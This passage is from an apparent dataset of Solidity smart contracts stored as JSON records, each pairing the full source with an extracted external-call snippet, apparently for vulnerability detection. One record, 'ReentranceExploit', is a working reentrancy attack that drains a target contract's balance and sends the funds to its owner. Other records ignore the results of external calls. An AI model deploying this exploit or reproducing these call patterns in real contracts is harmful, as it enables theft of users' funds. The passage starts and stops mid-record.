    "function safeApprove(address token, address to, uint value) internal {\n(bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\nrequire(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1660"
  },
  "filename": "44669.sol",
  "content": "pragma solidity ^0.5.16;\nimport \"./Owned.sol\";\nimport \"./Pausable.sol\";\nimport \"./MixinResolver.sol\";\nimport \"./interfaces/IBinaryOptionMarketManager.sol\";\nimport \"./AddressSetLib.sol\";\nimport \"./SafeDecimalMath.sol\";\nimport \"./BinaryOptionMarketFactory.sol\";\nimport \"./BinaryOptionMarket.sol\";\nimport \"./interfaces/IBinaryOptionMarket.sol\";\nimport \"./interfaces/IExchangeRates.sol\";\nimport \"./interfaces/ISystemStatus.sol\";\nimport \"./interfaces/IERC20.sol\";\ncontract BinaryOptionMarketManager is Owned, Pausable, MixinResolver, IBinaryOptionMarketManager {\n using SafeMath for uint;\n using AddressSetLib for AddressSetLib.AddressSet;\n struct Fees {\n uint poolFee;\n uint creatorFee;\n uint refundFee;\n }\n struct Durations {\n uint maxOraclePriceAge;\n uint expiryDuration;\n uint maxTimeToMaturity;\n }\n struct CreatorLimits {\n uint capitalRequirement;\n uint skewLimit;\n }\n Fees public fees;\n Durations public durations;\n CreatorLimits public creatorLimits;\n bool public marketCreationEnabled = true;\n uint public totalDeposited;\n AddressSetLib.AddressSet internal _activeMarkets;\n AddressSetLib.AddressSet internal _maturedMarkets;\n BinaryOptionMarketManager internal _migratingManager;\n bytes32 internal constant CONTRACT_SYSTEMSTATUS = \"SystemStatus\";\n bytes32 internal constant CONTRACT_SYNTHSUSD = \"SynthsUSD\";\n bytes32 internal constant CONTRACT_EXRATES = \"ExchangeRates\";\n bytes32 internal constant CONTRACT_BINARYOPTIONMARKETFACTORY = \"BinaryOptionMarketFactory\";\n constructor(\n address _owner,\n address _resolver,\n uint _maxOraclePriceAge,\n uint _expiryDuration,\n uint _maxTimeToMaturity,\n uint _creatorCapitalRequirement,\n uint _creatorSkewLimit,\n uint _poolFee,\n uint _creatorFee,\n uint _refundFee\n ) public Owned(_owner) Pausable() MixinResolver(_resolver) {\n owner = msg.sender;\n setExpiryDuration(_expiryDuration);\n setMaxOraclePriceAge(_maxOraclePriceAge);\n setMaxTimeToMaturity(_maxTimeToMaturity);\n setCreatorCapitalRequirement(_creatorCapitalRequirement);\n setCreatorSkewLimit(_creatorSkewLimit);\n setPoolFee(_poolFee);\n setCreatorFee(_creatorFee);\n setRefundFee(_refundFee);\n owner = _owner;\n }\n function resolverAddressesRequired() public view returns (bytes32[] memory addresses) {\n addresses = new bytes32[](4);\n addresses[0] = CONTRACT_SYSTEMSTATUS;\n addresses[1] = CONTRACT_SYNTHSUSD;\n addresses[2] = CONTRACT_EXRATES;\n addresses[3] = CONTRACT_BINARYOPTIONMARKETFACTORY;\n }\n function _systemStatus() internal view returns (ISystemStatus) {\n return ISystemStatus(requireAndGetAddress(CONTRACT_SYSTEMSTATUS));\n }\n function _sUSD() internal view returns (IERC20) {\n return IERC20(requireAndGetAddress(CONTRACT_SYNTHSUSD));\n }\n function _exchangeRates() internal view returns (IExchangeRates) {\n return IExchangeRates(requireAndGetAddress(CONTRACT_EXRATES));\n }\n function _factory() internal view returns (BinaryOptionMarketFactory) {\n return BinaryOptionMarketFactory(requireAndGetAddress(CONTRACT_BINARYOPTIONMARKETFACTORY));\n }\n function _isKnownMarket(address candidate) internal view returns (bool) {\n return _activeMarkets.contains(candidate) || _maturedMarkets.contains(candidate);\n }\n function numActiveMarkets() external view returns (uint) {\n return _activeMarkets.elements.length;\n }\n function activeMarkets(uint index, uint pageSize) external view returns (address[] memory) {\n return _activeMarkets.getPage(index, pageSize);\n }\n function numMaturedMarkets() external view returns (uint) {\n return _maturedMarkets.elements.length;\n }\n function maturedMarkets(uint index, uint pageSize) external view returns (address[] memory) {\n return _maturedMarkets.getPage(index, pageSize);\n }\n function _isValidKey(bytes32 oracleKey) internal view returns (bool) {\n IExchangeRates exchangeRates = _exchangeRates();\n if (exchangeRates.rateForCurrency(oracleKey) != 0) {\n if (oracleKey == \"sUSD\") {\n return false;\n }\n (uint entryPoint, , , , ) = exchangeRates.inversePricing(oracleKey);\n if (entryPoint != 0) {\n return false;\n }\n return true;\n }\n return false;\n }\n function setMaxOraclePriceAge(uint _maxOraclePriceAge) public onlyOwner {\n durations.maxOraclePriceAge = _maxOraclePriceAge;\n emit MaxOraclePriceAgeUpdated(_maxOraclePriceAge);\n }\n function setExpiryDuration(uint _expiryDuration) public onlyOwner {\n durations.expiryDuration = _expiryDuration;\n emit ExpiryDurationUpdated(_expiryDuration);\n }\n function setMaxTimeToMaturity(uint _maxTimeToMaturity) public onlyOwner {\n durations.maxTimeToMaturity = _maxTimeToMaturity;\n emit MaxTimeToMaturityUpdated(_maxTimeToMaturity);\n }\n function setPoolFee(uint _poolFee) public onlyOwner {\n uint totalFee = _poolFee + fees.creatorFee;\n require(totalFee < SafeDecimalMath.unit(), \"Total fee must be less than 100%.\");\n require(0 < totalFee, \"Total fee must be nonzero.\");\n fees.poolFee = _poolFee;\n emit PoolFeeUpdated(_poolFee);\n }\n function setCreatorFee(uint _creatorFee) public onlyOwner {\n uint totalFee = _creatorFee + fees.poolFee;\n require(totalFee < SafeDecimalMath.unit(), \"Total fee must be less than 100%.\");\n require(0 < totalFee, \"Total fee must be nonzero.\");\n fees.creatorFee = _creatorFee;\n emit CreatorFeeUpdated(_creatorFee);\n }\n function setRefundFee(uint _refundFee) public onlyOwner {\n require(_refundFee <= SafeDecimalMath.unit(), \"Refund fee must be no greater than 100%.\");\n fees.refundFee = _refundFee;\n emit RefundFeeUpdated(_refundFee);\n }\n function setCreatorCapitalRequirement(uint _creatorCapitalRequirement) public onlyOwner {\n creatorLimits.capitalRequirement = _creatorCapitalRequirement;\n emit CreatorCapitalRequirementUpdated(_creatorCapitalRequirement);\n }\n function setCreatorSkewLimit(uint _creatorSkewLimit) public onlyOwner {\n require(_creatorSkewLimit <= SafeDecimalMath.unit(), \"Creator skew limit must be no greater than 1.\");\n creatorLimits.skewLimit = _creatorSkewLimit;\n emit CreatorSkewLimitUpdated(_creatorSkewLimit);\n }\n function incrementTotalDeposited(uint delta) external onlyActiveMarkets notPaused {\n _systemStatus().requireSystemActive();\n totalDeposited = totalDeposited.add(delta);\n }\n function decrementTotalDeposited(uint delta) external onlyKnownMarkets notPaused {\n _systemStatus().requireSystemActive();\n totalDeposited = totalDeposited.sub(delta);\n }\n function createMarket(\n bytes32 oracleKey,\n uint strikePrice,\n bool refundsEnabled,\n uint[2] calldata times,\n uint[2] calldata bids\n )\n external\n notPaused\n returns (\n IBinaryOptionMarket\n )\n {\n _systemStatus().requireSystemActive();\n require(marketCreationEnabled, \"Market creation is disabled\");\n require(_isValidKey(oracleKey), \"Invalid key\");\n (uint biddingEnd, uint maturity) = (times[0], times[1]);\n require(maturity <= now + durations.maxTimeToMaturity, \"Maturity too far in the future\");\n uint expiry = maturity.add(durations.expiryDuration);\n uint initialDeposit = bids[0].add(bids[1]);\n require(now < biddingEnd, \"End of bidding has passed\");\n require(biddingEnd < maturity, \"Maturity predates end of bidding\");\n BinaryOptionMarket market = _factory().createMarket(\n msg.sender,\n [creatorLimits.capitalRequirement, creatorLimits.skewLimit],\n oracleKey,\n strikePrice,\n refundsEnabled,\n [biddingEnd, maturity, expiry],\n bids,\n [fees.poolFee, fees.creatorFee, fees.refundFee]\n );\n market.rebuildCache();\n _activeMarkets.add(address(market));\n totalDeposited = totalDeposited.add(initialDeposit);\n _sUSD().transferFrom(msg.sender, address(market), initialDeposit);\n emit MarketCreated(address(market), msg.sender, oracleKey, strikePrice, biddingEnd, maturity, expiry);\n return market;\n }\n function resolveMarket(address market) external {\n require(_activeMarkets.contains(market), \"Not an active market\");\n BinaryOptionMarket(market).resolve();\n _activeMarkets.remove(market);\n _maturedMarkets.add(market);\n }\n function cancelMarket(address market) external notPaused {\n require(_activeMarkets.contains(market), \"Not an active market\");\n address creator = BinaryOptionMarket(market).creator();\n require(msg.sender == creator, \"Sender not market creator\");\n BinaryOptionMarket(market).cancel(msg.sender);\n _activeMarkets.remove(market);\n emit MarketCancelled(market);\n }\n function expireMarkets(address[] calldata markets) external notPaused {\n for (uint i = 0; i < markets.length; i++) {\n address market = markets[i];\n BinaryOptionMarket(market).expire(msg.sender);\n _maturedMarkets.remove(market);\n emit MarketExpired(market);\n }\n }\n function rebuildMarketCaches(BinaryOptionMarket[] calldata marketsToSync) external {\n for (uint i = 0; i < marketsToSync.length; i++) {\n address market = address(marketsToSync[i]);\n bytes memory payload = abi.encodeWithSignature(\"rebuildCache()\");\n (bool success, ) = market.call(payload);\n if (!success) {\n bytes memory payloadForLegacyCache = abi.encodeWithSignature(\n \"setResolverAndSyncCache(address)\",\n address(resolver)\n );\n (bool legacySuccess, ) = market.call(payloadForLegacyCache);\n require(legacySuccess, \"Cannot rebuild cache for market\");\n }\n }\n }\n function setMarketCreationEnabled(bool enabled) public onlyOwner {\n if (enabled != marketCreationEnabled) {\n marketCreationEnabled = enabled;\n emit MarketCreationEnabledUpdated(enabled);\n }\n }\n function setMigratingManager(BinaryOptionMarketManager manager) public onlyOwner {\n _migratingManager = manager;\n }\n function migrateMarkets(\n BinaryOptionMarketManager receivingManager,\n bool active,\n BinaryOptionMarket[] calldata marketsToMigrate\n ) external onlyOwner {\n uint _numMarkets = marketsToMigrate.length;\n if (_numMarkets == 0) {\n return;\n }\n AddressSetLib.AddressSet storage markets = active ? _activeMarkets : _maturedMarkets;\n uint runningDepositTotal;\n for (uint i; i < _numMarkets; i++) {\n BinaryOptionMarket market = marketsToMigrate[i];\n require(_isKnownMarket(address(market)), \"Market unknown.\");\n markets.remove(address(market));\n runningDepositTotal = runningDepositTotal.add(market.deposited());\n market.nominateNewOwner(address(receivingManager));\n }\n totalDeposited = totalDeposited.sub(runningDepositTotal);\n emit MarketsMigrated(receivingManager, marketsToMigrate);\n receivingManager.receiveMarkets(active, marketsToMigrate);\n }\n function receiveMarkets(bool active, BinaryOptionMarket[] calldata marketsToReceive) external {\n require(msg.sender == address(_migratingManager), \"Only permitted for migrating manager.\");\n uint _numMarkets = marketsToReceive.length;\n if (_numMarkets == 0) {\n return;\n }\n AddressSetLib.AddressSet storage markets = active ? _activeMarkets : _maturedMarkets;\n uint runningDepositTotal;\n for (uint i; i < _numMarkets; i++) {\n BinaryOptionMarket market = marketsToReceive[i];\n require(!_isKnownMarket(address(market)), \"Market already known.\");\n market.acceptOwnership();\n markets.add(address(market));\n runningDepositTotal = runningDepositTotal.add(market.deposited());\n }\n totalDeposited = totalDeposited.add(runningDepositTotal);\n emit MarketsReceived(_migratingManager, marketsToReceive);\n }\n modifier onlyActiveMarkets() {\n require(_activeMarkets.contains(msg.sender), \"Permitted only for active markets.\");\n _;\n }\n modifier onlyKnownMarkets() {\n require(_isKnownMarket(msg.sender), \"Permitted only for known markets.\");\n _;\n }\n event MarketCreated(\n address market,\n address indexed creator,\n bytes32 indexed oracleKey,\n uint strikePrice,\n uint biddingEndDate,\n uint maturityDate,\n uint expiryDate\n );\n event MarketExpired(address market);\n event MarketCancelled(address market);\n event MarketsMigrated(BinaryOptionMarketManager receivingManager, BinaryOptionMarket[] markets);\n event MarketsReceived(BinaryOptionMarketManager migratingManager, BinaryOptionMarket[] markets);\n event MarketCreationEnabledUpdated(bool enabled);\n event MaxOraclePriceAgeUpdated(uint duration);\n event ExerciseDurationUpdated(uint duration);\n event ExpiryDurationUpdated(uint duration);\n event MaxTimeToMaturityUpdated(uint duration);\n event CreatorCapitalRequirementUpdated(uint value);\n event CreatorSkewLimitUpdated(uint value);\n event PoolFeeUpdated(uint fee);\n event CreatorFeeUpdated(uint fee);\n event RefundFeeUpdated(uint fee);\n}",
  "extract_feature": [
    "function rebuildMarketCaches(BinaryOptionMarket[] calldata marketsToSync) external {\nfor (uint i = 0; i < marketsToSync.length; i++) {\naddress market = address(marketsToSync[i]);\nbytes memory payload = abi.encodeWithSignature(\"rebuildCache()\");\n(bool success, ) = market.call(payload);\nif (!success) {\nbytes memory payloadForLegacyCache = abi.encodeWithSignature(\n\"setResolverAndSyncCache(address)\",\naddress(resolver)\n);\n(bool legacySuccess, ) = market.call(payloadForLegacyCache);\nrequire(legacySuccess, \"Cannot rebuild cache for market\");\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1661"
  },
  "filename": "44775.sol",
  "content": "pragma solidity ^0.5.16;\nimport \"./Owned.sol\";\nimport \"./interfaces/IRewardsDistribution.sol\";\nimport \"./SafeDecimalMath.sol\";\nimport \"./interfaces/IERC20.sol\";\nimport \"./interfaces/IFeePool.sol\";\nimport \"./interfaces/IRewardsDistribution.sol\";\ncontract RewardsDistribution is Owned, IRewardsDistribution {\n using SafeMath for uint;\n using SafeDecimalMath for uint;\n address public authority;\n address public synthetixProxy;\n address public rewardEscrow;\n address public feePoolProxy;\n DistributionData[] public distributions;\n constructor(\n address _owner,\n address _authority,\n address _synthetixProxy,\n address _rewardEscrow,\n address _feePoolProxy\n ) public Owned(_owner) {\n authority = _authority;\n synthetixProxy = _synthetixProxy;\n rewardEscrow = _rewardEscrow;\n feePoolProxy = _feePoolProxy;\n }\n function setSynthetixProxy(address _synthetixProxy) external onlyOwner {\n synthetixProxy = _synthetixProxy;\n }\n function setRewardEscrow(address _rewardEscrow) external onlyOwner {\n rewardEscrow = _rewardEscrow;\n }\n function setFeePoolProxy(address _feePoolProxy) external onlyOwner {\n feePoolProxy = _feePoolProxy;\n }\n function setAuthority(address _authority) external onlyOwner {\n authority = _authority;\n }\n function addRewardDistribution(address destination, uint amount) external onlyOwner returns (bool) {\n require(destination != address(0), \"Cant add a zero address\");\n require(amount != 0, \"Cant add a zero amount\");\n DistributionData memory rewardsDistribution = DistributionData(destination, amount);\n distributions.push(rewardsDistribution);\n emit RewardDistributionAdded(distributions.length - 1, destination, amount);\n return true;\n }\n function removeRewardDistribution(uint index) external onlyOwner {\n require(index <= distributions.length - 1, \"index out of bounds\");\n for (uint i = index; i < distributions.length - 1; i++) {\n distributions[i] = distributions[i + 1];\n }\n distributions.length--;\n }\n function editRewardDistribution(\n uint index,\n address destination,\n uint amount\n ) external onlyOwner returns (bool) {\n require(index <= distributions.length - 1, \"index out of bounds\");\n distributions[index].destination = destination;\n distributions[index].amount = amount;\n return true;\n }\n function distributeRewards(uint amount) external returns (bool) {\n require(amount > 0, \"Nothing to distribute\");\n require(msg.sender == authority, \"Caller is not authorised\");\n require(rewardEscrow != address(0), \"RewardEscrow is not set\");\n require(synthetixProxy != address(0), \"SynthetixProxy is not set\");\n require(feePoolProxy != address(0), \"FeePoolProxy is not set\");\n require(\n IERC20(synthetixProxy).balanceOf(address(this)) >= amount,\n \"RewardsDistribution contract does not have enough tokens to distribute\"\n );\n uint remainder = amount;\n for (uint i = 0; i < distributions.length; i++) {\n if (distributions[i].destination != address(0) || distributions[i].amount != 0) {\n remainder = remainder.sub(distributions[i].amount);\n IERC20(synthetixProxy).transfer(distributions[i].destination, distributions[i].amount);\n bytes memory payload = abi.encodeWithSignature(\"notifyRewardAmount(uint256)\", distributions[i].amount);\n (bool success, ) = distributions[i].destination.call(payload);\n if (!success) {\n }\n }\n }\n IERC20(synthetixProxy).transfer(rewardEscrow, remainder);\n IFeePool(feePoolProxy).setRewardsToDistribute(remainder);\n emit RewardsDistributed(amount);\n return true;\n }\n function distributionsLength() external view returns (uint) {\n return distributions.length;\n }\n event RewardDistributionAdded(uint index, address destination, uint amount);\n event RewardsDistributed(uint amount);\n}",
  "extract_feature": [
    "function distributeRewards(uint amount) external returns (bool) {\nrequire(amount > 0, \"Nothing to distribute\");\nrequire(msg.sender == authority, \"Caller is not authorised\");\nrequire(rewardEscrow != address(0), \"RewardEscrow is not set\");\nrequire(synthetixProxy != address(0), \"SynthetixProxy is not set\");\nrequire(feePoolProxy != address(0), \"FeePoolProxy is not set\");\nrequire(\nIERC20(synthetixProxy).balanceOf(address(this)) >= amount,\n\"RewardsDistribution contract does not have enough tokens to distribute\"\n);\nuint remainder = amount;\nfor (uint i = 0; i < distributions.length; i++) {\nif (distributions[i].destination != address(0) || distributions[i].amount != 0) {\nremainder = remainder.sub(distributions[i].amount);\nIERC20(synthetixProxy).transfer(distributions[i].destination, distributions[i].amount);\nbytes memory payload = abi.encodeWithSignature(\"notifyRewardAmount(uint256)\", distributions[i].amount);\n(bool success, ) = distributions[i].destination.call(payload);\nif (!success) {\n}\n}\n}\nIERC20(synthetixProxy).transfer(rewardEscrow, remainder);\nIFeePool(feePoolProxy).setRewardsToDistribute(remainder);\nemit RewardsDistributed(amount);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1662"
  },
  "filename": "44862.sol",
  "content": "pragma solidity ^0.4.15;\ncontract ReentranceExploit {\n bool public attackModeIsOn=false;\n address public vulnerable_contract;\n address public owner;\n function ReentranceExploit() public{\n owner = msg.sender;\n }\n function deposit(address _vulnerable_contract) public payable{\n vulnerable_contract = _vulnerable_contract ;\n require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\"))));\n }\n function launch_attack() public{\n attackModeIsOn = true;\n require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n }\n function () public payable{\n if (attackModeIsOn){\n attackModeIsOn = false;\n require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n }\n }\n function get_money(){\n suicide(owner);\n }\n}",
  "extract_feature": [
    "function launch_attack() public{\nattackModeIsOn = true;\nrequire(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1663"
  },
  "filename": "44864.sol",
  "content": "pragma solidity 0.4.15;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1664"
  },
  "filename": "44865.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary ECTools {\n function recoverSigner(bytes32 _hashedMsg, string _sig) public pure returns (address) {\n require(_hashedMsg != 0x00);\n bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n bytes32 prefixedHash = keccak256(abi.encodePacked(prefix, _hashedMsg));\n if (bytes(_sig).length != 132) {\n return 0x0;\n }\n bytes32 r;\n bytes32 s;\n uint8 v;\n bytes memory sig = hexstrToBytes(substring(_sig, 2, 132));\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27) {\n v += 27;\n }\n if (v < 27 || v > 28) {\n return 0x0;\n }\n return ecrecover(prefixedHash, v, r, s);\n }\n function isSignedBy(bytes32 _hashedMsg, string _sig, address _addr) public pure returns (bool) {\n require(_addr != 0x0);\n return _addr == recoverSigner(_hashedMsg, _sig);\n }\n function hexstrToBytes(string _hexstr) public pure returns (bytes) {\n uint len = bytes(_hexstr).length;\n require(len % 2 == 0);\n bytes memory bstr = bytes(new string(len / 2));\n uint k = 0;\n string memory s;\n string memory r;\n for (uint i = 0; i < len; i += 2) {\n s = substring(_hexstr, i, i + 1);\n r = substring(_hexstr, i + 1, i + 2);\n uint p = parseInt16Char(s) * 16 + parseInt16Char(r);\n bstr[k++] = uintToBytes32(p)[31];\n }\n return bstr;\n }\n function parseInt16Char(string _char) public pure returns (uint) {\n bytes memory bresult = bytes(_char);\n if ((bresult[0] >= 48) && (bresult[0] <= 57)) {\n return uint(bresult[0]) - 48;\n } else if ((bresult[0] >= 65) && (bresult[0] <= 70)) {\n return uint(bresult[0]) - 55;\n } else if ((bresult[0] >= 97) && (bresult[0] <= 102)) {\n return uint(bresult[0]) - 87;\n } else {\n revert();\n }\n }\n function uintToBytes32(uint _uint) public pure returns (bytes b) {\n b = new bytes(32);\n assembly {mstore(add(b, 32), _uint)}\n }\n function toEthereumSignedMessage(string _msg) public pure returns (bytes32) {\n uint len = bytes(_msg).length;\n require(len > 0);\n bytes memory prefix = \"\\x19Ethereum Signed Message:\\n\";\n return keccak256(abi.encodePacked(prefix, uintToString(len), _msg));\n }\n function uintToString(uint _uint) public pure returns (string str) {\n uint len = 0;\n uint m = _uint + 0;\n while (m != 0) {\n len++;\n m /= 10;\n }\n bytes memory b = new bytes(len);\n uint i = len - 1;\n while (_uint != 0) {\n uint remainder = _uint % 10;\n _uint = _uint / 10;\n b[i--] = byte(48 + remainder);\n }\n str = string(b);\n }\n function substring(string _str, uint _startIndex, uint _endIndex) public pure returns (string) {\n bytes memory strBytes = bytes(_str);\n require(_startIndex <= _endIndex);\n require(_startIndex >= 0);\n require(_endIndex <= strBytes.length);\n bytes memory result = new bytes(_endIndex - _startIndex);\n for (uint i = _startIndex; i < _endIndex; i++) {\n result[i - _startIndex] = strBytes[i];\n }\n return string(result);\n }\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n constructor(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\ncontract LedgerChannel {\n string public constant NAME = \"Ledger Channel\";\n string public constant VERSION = \"0.0.1\";\n uint256 public numChannels = 0;\n event DidLCOpen (\n bytes32 indexed channelId,\n address indexed partyA,\n address indexed partyI,\n uint256 ethBalanceA,\n address token,\n uint256 tokenBalanceA,\n uint256 LCopenTimeout\n );\n event DidLCJoin (\n bytes32 indexed channelId,\n uint256 ethBalanceI,\n uint256 tokenBalanceI\n );\n event DidLCDeposit (\n bytes32 indexed channelId,\n address indexed recipient,\n uint256 deposit,\n bool isToken\n );\n event DidLCUpdateState (\n bytes32 indexed channelId,\n uint256 sequence,\n uint256 numOpenVc,\n uint256 ethBalanceA,\n uint256 tokenBalanceA,\n uint256 ethBalanceI,\n uint256 tokenBalanceI,\n bytes32 vcRoot,\n uint256 updateLCtimeout\n );\n event DidLCClose (\n bytes32 indexed channelId,\n uint256 sequence,\n uint256 ethBalanceA,\n uint256 tokenBalanceA,\n uint256 ethBalanceI,\n uint256 tokenBalanceI\n );\n event DidVCInit (\n bytes32 indexed lcId,\n bytes32 indexed vcId,\n bytes proof,\n uint256 sequence,\n address partyA,\n address partyB,\n uint256 balanceA,\n uint256 balanceB\n );\n event DidVCSettle (\n bytes32 indexed lcId,\n bytes32 indexed vcId,\n uint256 updateSeq,\n uint256 updateBalA,\n uint256 updateBalB,\n address challenger,\n uint256 updateVCtimeout\n );\n event DidVCClose(\n bytes32 indexed lcId,\n bytes32 indexed vcId,\n uint256 balanceA,\n uint256 balanceB\n );\n struct Channel {\n address[2] partyAddresses;\n uint256[4] ethBalances;\n uint256[4] erc20Balances;\n uint256[2] initialDeposit;\n uint256 sequence;\n uint256 confirmTime;\n bytes32 VCrootHash;\n uint256 LCopenTimeout;\n uint256 updateLCtimeout;\n bool isOpen;\n bool isUpdateLCSettling;\n uint256 numOpenVC;\n HumanStandardToken token;\n }\n struct VirtualChannel {\n bool isClose;\n bool isInSettlementState;\n uint256 sequence;\n address challenger;\n uint256 updateVCtimeout;\n address partyA;\n address partyB;\n address partyI;\n uint256[2] ethBalances;\n uint256[2] erc20Balances;\n uint256[2] bond;\n HumanStandardToken token;\n }\n mapping(bytes32 => VirtualChannel) public virtualChannels;\n mapping(bytes32 => Channel) public Channels;\n function createChannel(\n bytes32 _lcID,\n address _partyI,\n uint256 _confirmTime,\n address _token,\n uint256[2] _balances\n )\n public\n payable\n {\n require(Channels[_lcID].partyAddresses[0] == address(0), \"Channel has already been created.\");\n require(_partyI != 0x0, \"No partyI address provided to LC creation\");\n require(_balances[0] >= 0 && _balances[1] >= 0, \"Balances cannot be negative\");\n Channels[_lcID].partyAddresses[0] = msg.sender;\n Channels[_lcID].partyAddresses[1] = _partyI;\n if(_balances[0] != 0) {\n require(msg.value == _balances[0], \"Eth balance does not match sent value\");\n Channels[_lcID].ethBalances[0] = msg.value;\n }\n if(_balances[1] != 0) {\n Channels[_lcID].token = HumanStandardToken(_token);\n require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"CreateChannel: token transfer failure\");\n Channels[_lcID].erc20Balances[0] = _balances[1];\n }\n Channels[_lcID].sequence = 0;\n Channels[_lcID].confirmTime = _confirmTime;\n Channels[_lcID].LCopenTimeout = now + _confirmTime;\n Channels[_lcID].initialDeposit = _balances;\n emit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);\n }\n function LCOpenTimeout(bytes32 _lcID) public {\n require(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);\n require(now > Channels[_lcID].LCopenTimeout);\n if(Channels[_lcID].initialDeposit[0] != 0) {\n Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);\n }\n if(Channels[_lcID].initialDeposit[1] != 0) {\n require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),\"CreateChannel: token transfer failure\");\n }\n emit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);\n delete Channels[_lcID];\n }\n function joinChannel(bytes32 _lcID, uint256[2] _balances) public payable {\n require(Channels[_lcID].isOpen == false);\n require(msg.sender == Channels[_lcID].partyAddresses[1]);\n if(_balances[0] != 0) {\n require(msg.value == _balances[0], \"state balance does not match sent value\");\n 